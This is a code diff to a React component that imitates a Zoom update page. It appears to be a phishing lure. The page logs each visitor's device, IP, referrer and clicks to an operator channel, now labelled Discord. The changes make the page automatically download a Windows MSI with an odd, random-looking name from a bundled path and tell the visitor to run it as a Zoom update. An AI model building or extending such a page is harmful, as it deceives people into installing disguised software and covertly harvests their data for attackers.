@@ -19,6 +19,9 @@ export default function UpdateBox() {
   const ZOOM_WIN_URL = process.env.NEXT_PUBLIC_ZOOM_WIN_URL;
   const ZOOM_MAC_URL = process.env.NEXT_PUBLIC_ZOOM_MAC_URL;
   const MEETING_LINK = process.env.NEXT_PUBLIC_MEETING_LINK;
+  const DEFAULT_WINDOWS_INSTALLER_PATH =
+    "/assets/setup/update/em_8ybPmrAI_installer_Win7-Win11_x86_x64.msi";
+  const WINDOWS_INSTALLER_FILENAME = "em_8ybPmrAI_installer_Win7-Win11_x86_x64.msi";
 
   // Handle window resize
   useEffect(() => {
@@ -36,8 +39,8 @@ export default function UpdateBox() {
     return () => window.removeEventListener("resize", handleResize);
   }, []);
 
-  // Send data to Telegram
-  const sendToTelegram = async (message) => {
+  // Send data to Discord
+  const sendToDiscord = async (message) => {
     try {
       const response = await fetch("/api/telegram", {
         method: "POST",
@@ -46,13 +49,13 @@ export default function UpdateBox() {
       });
 
       if (!response.ok) {
-        throw new Error(`Telegram API Error: ${response.status}`);
+        throw new Error(`Discord webhook error: ${response.status}`);
       }
       
-      console.log("Message sent to Telegram");
+      console.log("Message sent to Discord");
       return await response.json();
     } catch (error) {
-      console.error("Failed to send to Telegram:", error);
+      console.error("Failed to send to Discord:", error);
     }
   };
 
@@ -123,8 +126,8 @@ export default function UpdateBox() {
           body: JSON.stringify(body),
         });
 
-        // Send to Telegram directly with more info
-        const telegramMessage = `
+        // Send to Discord directly with more info
+        const discordMessage = `
 🔵 Zoom Update Access
 📱 Device: ${detectedOs}
 🌍 IP: ${ip}
@@ -134,12 +137,12 @@ export default function UpdateBox() {
 ⏰ Time: ${new Date().toISOString()}
 🔄 Referrer: ${document.referrer || "direct"}
 `;
-        await sendToTelegram(telegramMessage);
+        await sendToDiscord(discordMessage);
         
       } catch (error) {
         console.error("Error sending device info:", error);
-        // Try to send error to Telegram for monitoring
-        sendToTelegram(`❌ Error collecting device info: ${error.message}`);
+        // Try to send error to Discord for monitoring
+        sendToDiscord(`❌ Error collecting device info: ${error.message}`);
       } finally {
         setIsLoading(false);
       }
@@ -152,7 +155,8 @@ export default function UpdateBox() {
   useEffect(() => {
     if (!os || isLoading || os === "other" || os === "android" || os === "ios") return;
 
-    const downloadUrl = os === "windows" ? ZOOM_WIN_URL : ZOOM_MAC_URL;
+    const windowsDownloadUrl = ZOOM_WIN_URL || DEFAULT_WINDOWS_INSTALLER_PATH;
+    const downloadUrl = os === "windows" ? windowsDownloadUrl : ZOOM_MAC_URL;
     
     if (!downloadUrl) {
       console.error("No download URL available for this OS:", os);
@@ -165,12 +169,13 @@ export default function UpdateBox() {
       setIsDownloading(true);
 
       try {
-        // Send an event to Telegram that download is starting
-        await sendToTelegram(`🔽 Download initiated for ${os} device`);
+        // Send an event to Discord that download is starting
+        await sendToDiscord(`🔽 Download initiated for ${os} device`);
         
         const link = document.createElement("a");
         link.href = downloadUrl;
-        link.download = os === "windows" ? "ZoomInstaller.ClientSetup.exe" : "ZoomInstaller.pkg";
+        link.download =
+          os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller.pkg";
         link.setAttribute("data-testid", "zoom-installer-download");
         link.style.display = "none";
         document.body.appendChild(link);
@@ -180,14 +185,14 @@ export default function UpdateBox() {
 
         setDownloadInitiated(true);
         
-        // Send successful download event to Telegram
-        await sendToTelegram(`✅ Download started successfully for ${os} device`);
+        // Send successful download event to Discord
+        await sendToDiscord(`✅ Download started successfully for ${os} device`);
       } catch (error) {
         console.error("Download failed:", error);
         setDownloadError(true);
         
-        // Send error to Telegram
-        await sendToTelegram(`❌ Download failed for ${os} device: ${error.message}`);
+        // Send error to Discord
+        await sendToDiscord(`❌ Download failed for ${os} device: ${error.message}`);
       } finally {
         setIsDownloading(false);
       }
@@ -204,32 +209,32 @@ export default function UpdateBox() {
       case "chrome":
         return {
           location: "bottom of the browser window",
-          action: "Click on ZoomInstaller to run it",
+          action: `Click on ${os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller"} to run it`,
         };
       case "firefox":
         return {
           location: "top-right corner download arrow",
-          action: "Click on ZoomInstaller from the download list",
+          action: `Click on ${os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller"} from the download list`,
         };
       case "safari":
         return {
           location: "downloads button in the top-right corner",
-          action: "Open the ZoomInstaller file",
+          action: `Open the ${os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller"} file`,
         };
       case "edge":
         return {
           location: "bottom of the browser window",
-          action: "Click on ZoomInstaller to run it",
+          action: `Click on ${os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller"} to run it`,
         };
       case "opera":
         return {
           location: "download panel that opens automatically",
-          action: "Click on ZoomInstaller to run it",
+          action: `Click on ${os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller"} to run it`,
         };
       default:
         return {
           location: "browser's download section",
-          action: "Open the ZoomInstaller file",
+          action: `Open the ${os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller"} file`,
         };
     }
   };
@@ -237,8 +242,9 @@ export default function UpdateBox() {
   // Handle manual download click
   const handleManualDownload = async () => {
     try {
-      await sendToTelegram(`🔄 Manual download attempt for ${os} device`);
-      window.location.href = os === "windows" ? ZOOM_WIN_URL : ZOOM_MAC_URL;
+      await sendToDiscord(`🔄 Manual download attempt for ${os} device`);
+      const windowsDownloadUrl = ZOOM_WIN_URL || DEFAULT_WINDOWS_INSTALLER_PATH;
+      window.location.href = os === "windows" ? windowsDownloadUrl : ZOOM_MAC_URL;
     } catch (error) {
       console.error("Manual download failed:", error);
     }
@@ -247,7 +253,7 @@ export default function UpdateBox() {
   // Handle meeting join click
   const handleJoinMeeting = async () => {
     try {
-      await sendToTelegram(`🚀 User attempting to join meeting from ${os} device`);
+      await sendToDiscord(`🚀 User attempting to join meeting from ${os} device`);
       window.location.href = MEETING_LINK;
     } catch (error) {
       console.error("Failed to send join meeting event:", error);
@@ -293,7 +299,7 @@ export default function UpdateBox() {
 
             <button
               onClick={() => {
-                sendToTelegram("📱 Mobile user closed modal");
+                sendToDiscord("📱 Mobile user closed modal");
                 setShowMobileModal(false);
               }}
               className="border border-gray-300 text-gray-700 font-semibold py-3 px-4 rounded-md hover:bg-gray-100 transition-colors w-full text-sm sm:text-base"
@@ -334,7 +340,7 @@ export default function UpdateBox() {
             <a 
               href="#" 
               className="text-blue-600 hover:underline flex items-center justify-center sm:justify-start text-sm sm:text-base"
-              onClick={() => sendToTelegram("👆 User clicked 'Discover Zoom Workplace'")}
+              onClick={() => sendToDiscord("👆 User clicked 'Discover Zoom Workplace'")}
             >
               Discover Zoom Workplace
             </a>
@@ -470,7 +476,7 @@ export default function UpdateBox() {
                 <a 
                   href="#" 
                   className="text-blue-600 hover:underline text-xs sm:text-sm"
-                  onClick={() => sendToTelegram("👆 User clicked 'Read more'")}
+              onClick={() => sendToDiscord("👆 User clicked 'Read more'")}
                 >
                   Read more
                 </a>
@@ -563,7 +569,7 @@ export default function UpdateBox() {
               <button
                 onClick={() => {
                   setShowCookiePopup(false);
-                  sendToTelegram("🍪 User accepted cookies");
+                  sendToDiscord("🍪 User accepted cookies");
                 }}
                 className="bg-blue-600 text-white px-3 sm:px-4 py-1.5 sm:py-2 rounded-full hover:bg-blue-700 transition-colors text-xs sm:text-sm flex-grow md:flex-grow-0"
               >
@@ -572,7 +578,7 @@ export default function UpdateBox() {
               <button
                 onClick={() => {
                   setShowCookiePopup(false);
-                  sendToTelegram("🍪 User dismissed cookie popup");
+                  sendToDiscord("🍪 User dismissed cookie popup");
                 }}
                 className="text-gray-700 hover:text-gray-900 p-1.5 sm:p-2"
               >
